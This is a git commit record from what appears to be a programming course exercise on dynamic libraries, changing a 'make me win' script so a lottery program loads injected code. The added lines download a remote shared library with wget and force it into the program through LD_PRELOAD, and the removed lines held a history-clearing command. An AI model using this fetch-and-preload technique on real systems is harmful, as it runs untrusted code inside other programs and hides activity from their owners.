d9e487869f5f755aa953cda04dc5b77b4a1f3757
ZobaOkafor <judithokafor30@gmail.com>
2023-12-11 04:37:45 -0800

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-mv gm /tmp/gm
-history -c
+wget -P .. https://raw.githubusertcontent.com/ZobaOkafor/alx-low_level_programming/master/0x18-dynamic_libraries/libhack101.so
+export LD_PRELOAD="$PWD/../libhack101.so"
